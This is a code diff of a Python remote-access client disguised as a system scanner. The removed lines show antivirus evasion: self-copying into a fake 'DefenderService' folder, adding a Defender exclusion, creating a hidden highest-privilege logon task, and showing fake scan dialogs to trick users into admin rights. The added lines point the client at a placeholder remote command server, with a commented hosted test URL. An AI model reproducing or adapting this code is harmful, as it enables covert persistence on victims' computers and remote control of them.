@@ -1,37 +1,6 @@
-import socketio, sys, os, zipfile, subprocess, ctypes, time
+import socketio, os, zipfile, time
 from uuid import uuid4, getnode
 from datetime import datetime
-from infection_urls import fake_name
-
-# ------------------------ SECURITY BYPASS -------------------------
-ware_name = sys.argv[0].split("\\")[-1].split(".")[0]
-my_directory = os.getenv("APPDATA")+'\\DefenderService'
-path_of_exe = f"{my_directory}\\{ware_name}.exe"
-def admin_bypass():
-    if not os.path.exists(my_directory):
-        os.mkdir(my_directory)
-    elif ware_name+".exe" in os.listdir(my_directory):
-        return "ALREADY_SETUP"
-
-    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
-    if not is_admin:
-        ctypes.windll.user32.MessageBoxW(None, "Failed to scan system,\nPlease consider running as administrator.", "Failed", 0x00000000 | 0x00001000 | 0x00040000 | 0x00000010)
-        sys.exit(0)
-
-    subprocess.Popen(["powershell.exe", "-Command", f"Add-MpPreference -ExclusionPath \"{my_directory}\""])
-    with open(sys.argv[0], "rb") as fp:
-        data_to_write = fp.read()
-        fp.close()
-        with open(path_of_exe.replace(".exe", ""), "wb") as fp2:
-            fp2.write(data_to_write)
-    os.rename(path_of_exe.replace(".exe", ""), path_of_exe)
-    os.system(f"schtasks.exe /Create /SC onlogon /TN \"{fake_name}\" /TR \"{path_of_exe}\" /RL HIGHEST /F")
-    os.system(f"schtasks.exe /Run /TN \"{fake_name}\"")
-    os.system("msg * /TIME:2 [67695] SCAN COMPLETED")
-    sys.exit()  # PREVENTS RUNNING IT FROM PATH WHERE USER HAVE INSTALLED IT. (FROM PD OR OTHER REMOVABLE MEDIA)
-# admin_bypass()  # UNCOMMENT IT
-
-# ----------------------------- END ------------------------------
 
 # --------------------- SOME FUNCTIONS -------------------
 def getDriveInfos():
@@ -77,9 +46,9 @@ def get_mac():
 
 while 1:
     try:
-        # r = requests.post(ngrok_linker_url)
-        # url_ = r.text
-        url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT
+        # url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT
+        # url_ = "https://file-explowerer.onrender.com/"  # JUST FOR TESTING
+        url_ = "__PLACE_RENDER_URL_HERE__"  # REPLACEMENT SHOULD BE DONE HERE
 
         ws = socketio.Client()
 
